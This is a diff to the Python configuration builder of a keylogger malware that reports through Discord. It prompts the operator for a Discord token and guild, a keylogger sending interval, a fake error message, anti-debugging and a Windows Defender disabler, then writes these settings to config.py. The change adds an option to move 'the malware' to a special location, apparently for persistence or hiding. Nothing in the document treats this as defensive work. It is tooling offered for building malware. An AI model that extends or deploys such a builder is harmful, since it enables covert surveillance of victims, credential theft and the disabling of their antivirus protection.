@@ -33,8 +33,8 @@ def convert(value, name):
         print(Fore.RED +f"[-] Choice for {name} is invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
         sys.exit(0)
 
-def config(token, guild_id, interval, error, antidebug, defender):    
-    config = f"TOKEN = '{token}'\nGUILD_ID = '{guild_id}'\nINTERVAL = {interval}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}"
+def config(token, guild_id, interval, error, antidebug, defender, move):    
+    config = f"TOKEN = '{token}'\nGUILD_ID = '{guild_id}'\nINTERVAL = {interval}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}"
     
     with open("config.py", "w") as f:
         f.write(config)
@@ -46,9 +46,10 @@ interval = input("[?] Enter interval for keylogger sending (in secondes): ")
 error = input("[?] Enable fake error? [Y/n]: ")
 antidebug = input("[?] Enable antidebug? [Y/n]: ")
 defender = input("[?] Enable win defender disabler? [Y/n]: ")
+move = input("[?] Move the malware to the special location? [Y/n]: ")
 
 
-config(token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"))
+config(token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
 
 
 choice = input("> Do you want to edit building options[y/N]: ")
